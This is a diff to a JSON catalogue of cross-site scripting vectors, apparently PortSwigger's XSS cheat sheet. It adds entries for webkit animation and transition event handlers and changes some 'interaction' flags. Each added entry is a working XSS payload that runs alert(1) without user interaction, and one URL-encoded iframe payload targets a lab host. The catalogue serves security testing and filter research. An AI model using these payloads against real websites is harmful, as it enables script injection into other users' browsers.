@@ -8,7 +8,7 @@
 				        "browsers": [                    
                     "firefox"               
                 ],
-                "interaction": true
+                "interaction": false
             }
         ]
     },
@@ -21,7 +21,7 @@
 				        "browsers": [                    
                     "firefox"               
                 ],
-                "interaction": true
+                "interaction": false
             }
         ]
     },
@@ -1320,6 +1320,36 @@
                     "chrome",
                     "firefox",
                     "edge"
+                ],
+                "interaction": false
+            }
+        ]
+    },
+    "onwebkitanimationstart": {
+        "description": "Fires when a CSS animation starts",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<style>@keyframes x{}<\/style><* style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"><\/*>",
+				"browsers": [
+                    "chrome",                   
+                    "edge",
+                    "safari"
+                ],
+                "interaction": false
+            }
+        ]
+    },
+    "onwebkitanimationend": {
+        "description": "Fires when a CSS animation ends",        
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<style>@keyframes x{}<\/style><* style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"><\/*>",
+                "browsers": [
+                    "chrome",                   
+                    "edge",
+                    "safari"
                 ],
                 "interaction": false
             }
@@ -61678,6 +61708,20 @@
                 ],
                 "interaction": false,
                 "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23%27%2C%27%23x%27%29%7D%2C500%29%3BsetTimeout%28x%3D%3Ethat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23%27%29%2C1000%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cxmp%20id%3Dx%20style%3D%2522transition%3Atransform%2010s%2522%20ontransitioncancel%3Dalert%281%29%3Etest%3C%2Fxmp%3E%23%22%3E"
+            }
+        ]
+    },
+    "onwebkittransitionend": {
+        "description": "Fires when a CSS transition ends",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<style>:target {color:red;}<\/style><* id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)><\/*>",
+                "browsers": [
+                    "chrome"
+                ],
+                "interaction": false,
+                "hash": "#x"
             }
         ]
     },
